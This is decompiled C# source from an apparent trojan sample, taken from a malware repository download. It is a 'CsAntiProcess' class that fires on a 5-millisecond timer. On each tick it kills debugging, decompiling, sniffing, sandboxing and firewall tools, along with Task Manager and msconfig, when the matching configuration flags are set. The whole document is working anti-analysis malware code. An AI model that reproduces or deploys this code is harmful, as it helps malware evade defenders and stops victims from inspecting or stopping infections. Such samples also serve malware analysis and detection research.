// Decompiled with JetBrains decompiler
// Type: CsAntiProcess
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 80F3D6AD-D502-4CFE-A32C-03E83ADAF2E9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-17877cf37b9264ba88dcfd0825f321f42531f8b880c52b43c0606b0b2c06d548.exe

using Microsoft.VisualBasic.CompilerServices;
using Stub;
using System.Diagnostics;
using System.Timers;

public class CsAntiProcess
{
  private static Fransesco n = new Fransesco();
  private static Timer _timer;

  [DebuggerNonUserCode]
  public CsAntiProcess()
  {
  }

  public static void Handler(object sender, ElapsedEventArgs e)
  {
    if (Fransesco.prs == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("processhacker");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.exp == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("dnSpy");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.ess == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("procexp");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.sbi == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("SbieCtrl");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.spy == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("SpyTheSpy");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.war == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("wireshark");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.dns == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("apateDNS");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.aip == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("IPBlocker");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.tag == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("TiGeR-Firewall");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.sms == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("smsniff");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.rcd == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("NetSnifferCs");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.san == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("Sandboxie Control");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.ger == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("taskmgr");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.mas == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("msconfig");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.ils == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("ILSpy");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.@ref == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("CodeReflect");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.rfl == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("Reflector");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (Fransesco.exl != Conversions.ToBoolean("True"))
      return;
    Process[] processesByName1 = Process.GetProcessesByName("MegaDumper");
    int index1 = 0;
    while (index1 < processesByName1.Length)
    {
      processesByName1[index1].Kill();
      checked { ++index1; }
    }
  }

  public static void Start()
  {
    CsAntiProcess._timer = new Timer(5.0);
    CsAntiProcess._timer.Elapsed += new ElapsedEventHandler(CsAntiProcess.Handler);
    CsAntiProcess._timer.Enabled = true;
  }
}
